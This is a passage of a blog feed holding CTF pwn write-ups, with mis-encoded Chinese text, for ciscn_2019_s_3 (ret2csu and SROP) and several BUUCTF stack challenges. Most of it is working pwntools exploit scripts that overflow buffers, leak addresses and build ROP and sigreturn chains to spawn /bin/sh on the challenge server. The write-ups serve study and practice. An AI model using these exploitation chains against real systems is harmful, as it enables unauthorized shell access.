    <content type="html"><![CDATA[<h1 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a><strong>ciscn_2019_s_3</strong></h1><p>å›½èµ›çš„ä¸€é“æ ˆé¢˜</p><p>mainå‡½æ•°</p><p><img src="/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/image-20210214151957313.png" alt="image-20210214151957313"></p><p>vulnå‡½æ•°</p><p><img src="/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/image-20210214152021865.png" alt="image-20210214152021865"></p><p>gadgetså‡½æ•°</p><p><img src="/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/image-20210214152042139.png" alt="image-20210214152042139"></p><p>çœ‹ä¸€ä¸‹gadgetså‡½æ•°</p><p>é‡Œé¢æœ‰0fï¼ˆ15ï¼‰å’Œ3bï¼ˆ59ï¼‰çœ‹ä¸€ä¸‹è¿™ä¸¤ä¸ªæ˜¯ä»€ä¹ˆ</p><blockquote><p>15 sys_rt_sigreturn<br>59 sys_execve</p></blockquote><p><strong>æ¥ä¸‹æ¥è¯´ä¸€ä¸‹syscall</strong></p><h2 id="syscall"><a href="#syscall" class="headerlink" title="syscall"></a>syscall</h2><p>ä»€ä¹ˆæ—¶syscall</p><p>çœ‹wiki</p><p><img src="/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/image-20210214153005144.png" alt="image-20210214153005144"></p><p>åœ¨32ä½å’Œ64ä½ä¸­æ˜¯æœ‰äº›ä¸åŒçš„</p><blockquote><p>32ä½ï¼š</p><p>ä¼ å‚æ–¹å¼ï¼šé¦–å…ˆå°†ç³»ç»Ÿè°ƒç”¨å· ä¼ å…¥ eaxï¼Œç„¶åå°†å‚æ•° ä»å·¦åˆ°å³ ä¾æ¬¡å­˜å…¥ ebxï¼Œecxï¼Œedxå¯„å­˜å™¨ä¸­ï¼Œè¿”å›å€¼å­˜åœ¨eaxå¯„å­˜å™¨</p><p>è°ƒç”¨å·ï¼šsys_read çš„è°ƒç”¨å· ä¸º 3 sys_write çš„è°ƒç”¨å· ä¸º 4</p><p>è°ƒç”¨æ–¹å¼: ä½¿ç”¨ int 80h ä¸­æ–­è¿›è¡Œç³»ç»Ÿè°ƒç”¨</p><p>64ä½ï¼š</p><p>ä¼ å‚æ–¹å¼ï¼šé¦–å…ˆå°†ç³»ç»Ÿè°ƒç”¨å· ä¼ å…¥ raxï¼Œç„¶åå°†å‚æ•° ä»å·¦åˆ°å³ ä¾æ¬¡å­˜å…¥ rdiï¼Œrsiï¼Œrdxå¯„å­˜å™¨ä¸­ï¼Œè¿”å›å€¼å­˜åœ¨raxå¯„å­˜å™¨</p><p>è°ƒç”¨å·ï¼šsys_read çš„è°ƒç”¨å· ä¸º 0 sys_write çš„è°ƒç”¨å· ä¸º 1</p><p>stub_execve çš„è°ƒç”¨å· ä¸º 59 stub_rt_sigreturn çš„è°ƒç”¨å· ä¸º 15</p><p>è°ƒç”¨æ–¹å¼: ä½¿ç”¨ syscall è¿›è¡Œç³»ç»Ÿè°ƒç”¨</p></blockquote><h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><p>æ¥ä¸‹æ¥ç»§ç»­çœ‹é¢˜è§£</p><p>ä»æ±‡ç¼–ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°</p><p>åœ¨vulnå‡½æ•°ä¸­æœ‰æ ˆæº¢å‡º</p><p><img src="/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/image-20210214153444144.png" alt="image-20210214153444144"></p><p>åŒæ—¶è¿™ä¸ªé¢˜è¿˜æœ‰ä¸€ä¸ªåœ°æ–¹</p><p>å°±æ˜¯æœ€åæ—¶æ²¡æœ‰leaveçš„</p><p>ä¹Ÿå°±æ˜¯offsetæ˜¯0x10ï¼Œä¹‹åå°±æ˜¯è¿”å›åœ°å€</p><hr><p>æ¥ä¸‹æ¥çœ‹gadgets</p><p>å®ƒé‡Œé¢æœ‰ä¸¤ä¸ªè°ƒç”¨å·</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov raxï¼Œ0Fh    &#x2F;&#x2F;   0Fh  å³15    è€Œ15 å¯¹åº”çš„æ˜¯ sys_rt_sigreturnç³»ç»Ÿè°ƒç”¨</span><br><span class="line">mov raxï¼Œ3Bh     &#x2F;&#x2F;  3Bh  å³ 59    è€Œ15 å¯¹åº”çš„æ˜¯  sys_execve ç³»ç»Ÿè°ƒç”¨</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æœ‰ä¸¤ç§æ–¹æ³•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ç¬¬ä¸€ç§ï¼šåˆ©ç”¨ ret2__libc_csu_init å»æ„é€  execve(&quot;&#x2F;bin&#x2F;sh&quot;,0,0) æ¥ getshell</span><br><span class="line">ç¬¬äºŒç§ï¼šç›´æ¥srop ä¼ªé€  sigreturn frame å» æ„é€  execve(&quot;&#x2F;bin&#x2F;sh&quot;,0,0) æ¥ getshell</span><br></pre></td></tr></table></figure><h2 id="ç¬¬ä¸€ç§"><a href="#ç¬¬ä¸€ç§" class="headerlink" title="ç¬¬ä¸€ç§"></a>ç¬¬ä¸€ç§</h2><h3 id="ret2-libc-csu-init"><a href="#ret2-libc-csu-init" class="headerlink" title="ret2__libc_csu_init"></a>ret2__libc_csu_init</h3><p>æ—¢ç„¶æƒ³ç³»ç»Ÿè°ƒç”¨ï¼Œæˆ‘ä»¬å°±å¾—ä¼ å‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rdi &quot;&#x2F;bin&#x2F;sh&quot;çš„æŒ‡é’ˆ</span><br><span class="line">rsi 0</span><br><span class="line">rdx 0</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæƒ³åˆ°çš„è‚¯å®šæ˜¯gadget</p><p><img src="/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/image-20210214154550271.png" alt="image-20210214154550271"></p><p>rdi rsi éƒ½æœ‰äº†ä½†é—®é¢˜æ˜¯æ²¡æœ‰rdx</p><p>è¿™æ—¶å°±å¯ä»¥çœ‹idaäº†</p><p><img src="/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/image-20210214162318162.png" alt="image-20210214162318162"></p><p>çœ‹åˆ°æœ‰rdx</p><p>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨gadgetäº†ï¼Œä½†é—®é¢˜æ˜¯è¦æƒ³è·å¾—/bin/shçš„æŒ‡é’ˆ</p><p>å°±éœ€è¦çŸ¥é“æ ˆä¸Šçš„åœ°å€</p><p>ä¹Ÿä¸çŸ¥é“æ˜¯ä»€ä¹ˆï¼Œçœ‹ç½‘ä¸Šwpï¼Œéƒ½è¯´writeä¸­æœ‰ï¼Œè°ƒè¯•äº†ä¸€ä¸‹ç¡®å®</p><p>åŸå› ä¸å¤ªæ¸…æ¥š</p><p>æ¥ä¸‹æ¥å°±æ˜¯å†™wpäº†</p><ol><li><p>ç¬¬ä¸€æ­¥æˆ‘ä»¬éœ€è¦å¾—åˆ°bin/shçš„æŒ‡é’ˆ</p></li><li><p>æ¥ä¸‹æ¥ç¬¬äºŒæ­¥å°±æ˜¯ROPï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªä¸å¥½ç†è§£çš„å°±æ˜¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call    qword ptr [r12+rbx*8]</span><br></pre></td></tr></table></figure><p>å› ä¸ºæˆ‘ä»¬r12æ˜¯æŒ‡å‘æ ˆä¸Šçš„,ä¸”rbxæ¯æ¬¡éƒ½æ˜¯åŠ ä¸€ï¼Œè¿™æ ·å…¶å®å°±åˆ©ç”¨äº†æˆ‘ä»¬çš„gadget</p></li><li><p>æœ€åå°±æ˜¯å¾ªç¯è°ƒç”¨ä¸Šé¢çš„callï¼ŒçŸ¥é“ç³»ç»Ÿè°ƒç”¨</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#context.os='linux'</span></span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line"><span class="comment">#context.arch = elf.arch</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process("./ciscn_2019_s_3")</span></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">28985</span>)</span><br><span class="line">elf = ELF(<span class="string">'./ciscn_s_3'</span>)</span><br><span class="line">vuln_addr=<span class="number">0x4004ED</span></span><br><span class="line">mov_rax_execv_addr=<span class="number">0x4004E2</span>   </span><br><span class="line">pop_rdi_ret_addr=<span class="number">0x4005a3</span>  </span><br><span class="line">pop_rbx_rbp_r12_r13_r14_r15_ret_addr=<span class="number">0x40059A</span></span><br><span class="line">__libc_csu_init_addr=<span class="number">0x400580</span>  <span class="comment"># __libc_csu_init gadget é¦–åœ°å€</span></span><br><span class="line">syscall_addr=<span class="number">0x400501</span>             <span class="comment">#idaä¸­æŸ¥çœ‹</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">'/bin/sh\x00'</span>*<span class="number">2</span>+p64(vuln_addr)</span><br><span class="line">sl(payload1)</span><br><span class="line">r(<span class="number">0x20</span>)</span><br><span class="line">bin_sh_addr=uu64(r(<span class="number">8</span>))<span class="number">-280</span></span><br><span class="line">leak(<span class="string">"/bin/sh"</span>,bin_sh_addr)</span><br><span class="line">payload2=<span class="string">'/bin/sh\x00'</span>*<span class="number">2</span>+p64(pop_rbx_rbp_r12_r13_r14_r15_ret_addr)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(bin_sh_addr+<span class="number">0x50</span>)+p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">print(hex(bin_sh_addr+<span class="number">0x50</span>))</span><br><span class="line">payload2+=p64(__libc_csu_init_addr)+p64(mov_rax_execv_addr)</span><br><span class="line">payload2+=p64(pop_rdi_ret_addr)+p64(bin_sh_addr)+p64(syscall_addr) </span><br><span class="line">sl(payload2)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><p><strong>è¿™å°±æ˜¯ret2__libc_csu_init()</strong></p><h2 id="ç¬¬äºŒç§"><a href="#ç¬¬äºŒç§" class="headerlink" title="ç¬¬äºŒç§"></a>ç¬¬äºŒç§</h2><p>å…ˆä»‹ç»SROP</p><h3 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h3><p>SROPä¹Ÿæ˜¯æ ˆæº¢å‡ºï¼Œä½†ä¸åŒROPçš„æ˜¯ã€‚</p><p>SROPä½¿ç”¨èƒ½å¤Ÿè°ƒç”¨sigreturnçš„gadgetè¦†ç›–è¿”å›åœ°å€ï¼Œå¹¶å°†ä¸€ä¸ªä¼ªé€ çš„sigcontextç»“æ„ä½“æ”¾åˆ°æ ˆä¸­ã€‚</p><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a><strong>åŸç†</strong></h3><p><strong>signalæœºåˆ¶</strong></p><p>å½“æœ‰ä¸­æ–­æˆ–å¼‚å¸¸äº§ç”Ÿæ—¶ï¼Œå†…æ ¸ä¼šå‘æŸä¸ªè¿›ç¨‹å‘é€ä¸€ä¸ªsignalï¼Œè¯¥è¿›ç¨‹è¢«æŒ‚èµ·å¹¶è¿›å…¥å†…æ ¸ï¼Œç„¶åå†…æ ¸ä¸ºå…¶ä¿å­˜ä¸Šä¸‹æ–‡ï¼Œå†è·³è½¬åˆ°ä¹‹å‰æ³¨å†Œå¥½çš„signal handlerä¸­è¿›è¡Œå¤„ç†</p><p>å¾…signal handlerè¿”å›åï¼Œå†…æ ¸ä¸ºè¯¥è¿›ç¨‹æ¢å¤ä¹‹å‰ä¿å­˜çš„ä¸Šä¸‹æ–‡ï¼Œæœ€ç»ˆæ¢å¤æ‰§è¡Œã€‚</p><ol><li>ä¸€ä¸ªsignal frameè¢«æ·»åŠ åˆ°æ ˆï¼Œè¿™ä¸ªframeåŒ…å«äº†å¯„å­˜å™¨çš„å€¼å’Œä¸€äº›signalä¿¡æ¯</li><li>ä¸€ä¸ªæ–°çš„è¿”å›åœ°å€è¢«æ·»åŠ åˆ°æ ˆé¡¶ï¼Œè¿™ä¸ªè¿”å›åœ°å€æŒ‡å‘sigreturnè°ƒç”¨</li><li>signal handler è¢«è°ƒç”¨ï¼Œsignal handlerçš„è¡Œä¸ºå–å†³äºæ”¶åˆ°ä»€ä¹ˆsignal</li><li>signal handleræ‰§è¡Œåï¼Œå¦‚æœç¨‹åºæ²¡æœ‰ç»ˆæ­¢ï¼Œåˆ™è¿”å›åœ°å€ç”¨äºæ‰§è¡Œsigreturnè°ƒç”¨</li><li>sigreturnåˆ©ç”¨signal frameæ¢å¤æ‰€æœ‰å¯„å­˜å™¨ä»¥å›åˆ°ä¹‹å‰çŠ¶æ€</li><li>ç¨‹åºç»§ç»­æ‰§è¡Œ</li></ol><p><img src="/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/image-20210214203411860.png" alt="image-20210214203411860"></p><blockquote><p>æˆ‘ä»¬ç§° ucontext ä»¥åŠ siginfo è¿™ä¸€æ®µä¸º Signal Frameã€‚</p><p>å…¶ä¸­ï¼Œ32 ä½çš„ sigreturn çš„è°ƒç”¨å·ä¸º 77ï¼Œ64 ä½çš„ç³»ç»Ÿè°ƒç”¨å·ä¸º 15ã€‚</p></blockquote><h3 id="æ”»å‡»æ€è·¯"><a href="#æ”»å‡»æ€è·¯" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h3><p>ç³»ç»Ÿåœ¨æ‰§è¡Œsigreturnç³»ç»Ÿè°ƒç”¨çš„æ—¶å€™ï¼Œä¸ä¼šå¯¹signalæ£€æŸ¥ã€‚</p><p>ç”±äºsigreturnä¼šä»ç”¨æˆ·æ ˆä¸Šæ¢å¤æ‰€æœ‰å¯„å­˜å™¨çš„å€¼ï¼Œè€Œç”¨æˆ·æ ˆæ˜¯ä¿å­˜åœ¨ç”¨æˆ·è¿›ç¨‹åœ°å€ç©ºé—´ä¸­çš„ï¼Œæ˜¯ç”¨æˆ·è¿›ç¨‹å¯è¯»å†™çš„ã€‚</p><p>å¦‚æœæ”»å‡»è€…æ§åˆ¶æ ˆï¼Œä¹Ÿå°±æ§åˆ¶äº†å¯„å­˜å™¨çš„å€¼ã€‚</p><p><img src="/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/image-20210214203929462.png" alt="image-20210214203929462"></p><p><strong>ä¸€ç³»åˆ—å‡½æ•°</strong></p><p><img src="/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/image-20210215144016291.png" alt="image-20210215144016291"></p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬åœ¨æ„é€  ROP æ”»å‡»çš„æ—¶å€™ï¼Œéœ€è¦æ»¡è¶³ä¸‹é¢çš„æ¡ä»¶</p><ul><li><strong>å¯ä»¥é€šè¿‡æ ˆæº¢å‡ºæ¥æ§åˆ¶æ ˆçš„å†…å®¹</strong></li><li>éœ€è¦çŸ¥é“ç›¸åº”çš„åœ°å€<ul><li><strong>â€œ/bin/shâ€</strong></li><li><strong>Signal Frame</strong></li><li><strong>syscall</strong></li><li><strong>sigreturn</strong></li></ul></li><li>éœ€è¦æœ‰å¤Ÿå¤§çš„ç©ºé—´æ¥å¡ä¸‹æ•´ä¸ª sigal frame</li></ul><p>æ¥ä¸‹æ¥ï¼Œçœ‹æˆ‘ä»¬è¿™ä¸ªé¢˜</p><p>syscall sigreturn æ˜¯æˆ‘ä»¬çŸ¥é“çš„</p><p>æ¥ä¸‹æ¥è§£å†³bin/shå°±å¯ä»¥ï¼Œç”±ç¬¬ä¸€ç§è§£æ³•æˆ‘ä»¬å·²ç»çŸ¥é“æ ˆä¸ŠæŒ‡å‘/bin/shçš„æŒ‡é’ˆ</p><p>æ¥ä¸‹æ¥ç›´æ¥å†™å°±è¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">29158</span>)</span><br><span class="line">elf = ELF(<span class="string">'./ciscn_s_3'</span>)</span><br><span class="line">context.arch = elf.arch</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x04005a3</span></span><br><span class="line">syscall = <span class="number">0x0000000000400501</span></span><br><span class="line">main_addr = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">vuln_addr = <span class="number">0x4004ED</span></span><br><span class="line">sigreturn = <span class="number">0x04004DA</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">"/bin/sh\x00/bin/sh\x00"</span> + p64(vuln_addr)</span><br><span class="line">sl(payload1)</span><br><span class="line">print(r(<span class="number">0x20</span>))</span><br><span class="line">binsh = u64(r(<span class="number">8</span>)) - <span class="number">0x118</span></span><br><span class="line">leak(<span class="string">"/bin/sh"</span>,binsh)</span><br><span class="line">r(<span class="number">8</span>)</span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = binsh</span><br><span class="line">sigframe.rsi = <span class="number">0</span></span><br><span class="line">sigframe.rdx = <span class="number">0</span></span><br><span class="line">sigframe.rip = syscall</span><br><span class="line">payload = <span class="string">"/bin/sh\x00/bin/sh\x00"</span> + p64(sigreturn) + p64(syscall) + str(sigframe)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><blockquote><p>pwntoolså·²ç»é›†æˆäº†sigreturn</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ciscn-2019-s-3&quot;&gt;&lt;a href=&quot;#ciscn-2019-s-3&quot; class=&quot;headerlink&quot; title=&quot;ciscn_2019_s_3&quot;&gt;&lt;/a&gt;&lt;strong&gt;ciscn_2019_s_3&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;å›½èµ›çš„ä¸€é“</summary>
      
    
    
    
    
    <category term="åˆ·é¢˜" scheme="https://pz1o.top/tags/%E5%88%B7%E9%A2%98/"/>
    
    <category term="wp" scheme="https://pz1o.top/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>BUU(PWN1)</title>
    <link href="https://pz1o.top/2021/01/23/BUU-PWN/"/>
    <id>https://pz1o.top/2021/01/23/BUU-PWN/</id>
    <published>2021-01-23T06:22:39.000Z</published>
    <updated>2021-02-15T07:19:42.226Z</updated>
    
    <content type="html"><![CDATA[<p>å¯’å‡å¼€å§‹åˆ·é¢˜</p><h1 id="BUUï¼ˆæ ˆï¼‰"><a href="#BUUï¼ˆæ ˆï¼‰" class="headerlink" title="BUUï¼ˆæ ˆï¼‰"></a>BUUï¼ˆæ ˆï¼‰</h1><h2 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#node3.buuoj.cn:28301</span></span><br><span class="line">r = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">28301</span>)</span><br><span class="line"><span class="comment">#r = process("")</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'A'</span>*(<span class="number">0x40</span>+<span class="number">0x8</span>) + p64(<span class="number">0x40060d</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">28698</span>)</span><br><span class="line"><span class="comment">#r = process("./pwn1_sctf_2016")</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'I'</span>*<span class="number">20</span> + <span class="string">b'A'</span>*<span class="number">0x4</span> + p32(<span class="number">0x08048F0D</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="ç¬¬å…­ç« -CTFä¹‹PWNç« -stack"><a href="#ç¬¬å…­ç« -CTFä¹‹PWNç« -stack" class="headerlink" title="[ç¬¬å…­ç«  CTFä¹‹PWNç« ]stack"></a>[ç¬¬å…­ç«  CTFä¹‹PWNç« ]stack</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">26846</span>)</span><br><span class="line"><span class="comment">#r = process("./stack")</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'A'</span>*(<span class="number">0xA</span>+<span class="number">0x8</span>) + p64(<span class="number">0x400537</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="ç¬¬å…­ç« -CTFä¹‹PWNç« -ROPï¼ˆ64ä½ç³»ç»Ÿè°ƒç”¨ï¼‰"><a href="#ç¬¬å…­ç« -CTFä¹‹PWNç« -ROPï¼ˆ64ä½ç³»ç»Ÿè°ƒç”¨ï¼‰" class="headerlink" title="[ç¬¬å…­ç«  CTFä¹‹PWNç« ]ROPï¼ˆ64ä½ç³»ç»Ÿè°ƒç”¨ï¼‰"></a>[ç¬¬å…­ç«  CTFä¹‹PWNç« ]ROPï¼ˆ64ä½ç³»ç»Ÿè°ƒç”¨ï¼‰</h2><p>64ä½çš„ç³»ç»Ÿè°ƒç”¨</p><p>&gt;<br>&gt;<br>&gt;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p&#x3D;process(&#39;.&#x2F;rop&#39;)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;rop&#39;)</span><br><span class="line">libc &#x3D; elf.libc</span><br><span class="line">pop_rdi &#x3D; 0x4005d3</span><br><span class="line">puts_got &#x3D; 0x601018</span><br><span class="line">puts &#x3D; 0x400430</span><br><span class="line">main &#x3D; 0x400537</span><br><span class="line">rop1 &#x3D; &quot;a&quot;*18</span><br><span class="line">rop1 +&#x3D; p64(pop_rdi)</span><br><span class="line">rop1 +&#x3D; p64(puts_got)</span><br><span class="line">rop1 +&#x3D; p64(puts)</span><br><span class="line">rop1 +&#x3D; p64(main)</span><br><span class="line">p.sendline(rop1)</span><br><span class="line">p.recvuntil(&#39;\n&#39;)</span><br><span class="line">addr &#x3D; u64(p.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">libc_base &#x3D; addr - libc.symbols[&#39;puts&#39;]</span><br><span class="line">info(&quot;libc:0x%x&quot;,libc_base)</span><br><span class="line">pop_rax &#x3D; 0x00000000000439c8 + libc_base</span><br><span class="line">pop_rdi &#x3D; 0x000000000002155f + libc_base</span><br><span class="line">pop_rsi &#x3D; 0x0000000000023e6a + libc_base</span><br><span class="line">pop_rdx &#x3D; 0x0000000000001b96 + libc_base</span><br><span class="line">syscall &#x3D; 0x00000000000d2975 + libc_base</span><br><span class="line">binsh   &#x3D; next(libc.search(&quot;&#x2F;bin&#x2F;sh&quot;),) + libc_base</span><br><span class="line">rop2 &#x3D; &quot;a&quot;*18</span><br><span class="line">rop2 +&#x3D; p64(pop_rax)</span><br><span class="line">rop2 +&#x3D; p64(59)</span><br><span class="line">rop2 +&#x3D; p64(pop_rdi)</span><br><span class="line">rop2 +&#x3D; p64(binsh)</span><br><span class="line">rop2 +&#x3D; p64(pop_rsi)</span><br><span class="line">rop2 +&#x3D; p64(0)</span><br><span class="line">rop2 +&#x3D; p64(pop_rdx)</span><br><span class="line">rop2 +&#x3D; p64(0)</span><br><span class="line">rop2 +&#x3D; p64(syscall)</span><br><span class="line"> </span><br><span class="line">p.recvuntil(&quot;hello\n&quot;)</span><br><span class="line">p.sendline(rop2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" 